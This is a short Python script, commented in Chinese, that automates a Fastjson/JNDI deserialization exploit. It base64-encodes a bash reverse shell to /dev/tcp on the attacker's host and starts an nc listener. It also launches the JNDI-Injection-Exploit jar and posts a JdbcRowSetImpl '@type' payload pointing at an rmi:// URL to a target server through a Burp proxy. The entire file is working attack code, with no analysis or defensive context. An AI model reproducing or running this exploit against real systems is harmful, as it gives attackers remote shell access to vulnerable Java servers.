"""
放到 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar 目录下
"""
import json
import os
import subprocess
from base64 import b64encode

ip, port = '192.168.50.161:7777'.split(':')
cmd_plain = f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
rev_ip = b64encode(cmd_plain.encode()).decode()
cmd = r'bash -c {echo,%s}|{base64,-d}|{bash,-i}' % rev_ip
print(cmd)

print('nc -lvvp 7777')
os.system('start nc -lvvp 7777')
# java_cmd = f'java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "ls" -A "{ip}"'
# print(java_cmd)
rev_shell = f'java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "{cmd}" -A "{ip}"'
print(rev_shell)
os.system(f'start {rev_shell}')
# print(r'{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://%s:1099/eflw0q","autoCommit":true}}' % ip)
ra = input('rmi://192.168.50.161:1099/????: 输入????部分的内容\n')
print('Burp 发送请求 1.改POST 2. Content-Type:application/json 3.body内容如下')
data1 = r'{"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://%s:1099/%s","autoCommit":true}}' % (
    ip, ra)
print(data1)

import requests

requests.post('http://192.168.127.129:49153', json=json.loads(data1), proxies={'http':'http://127.0.0.1:8080'})
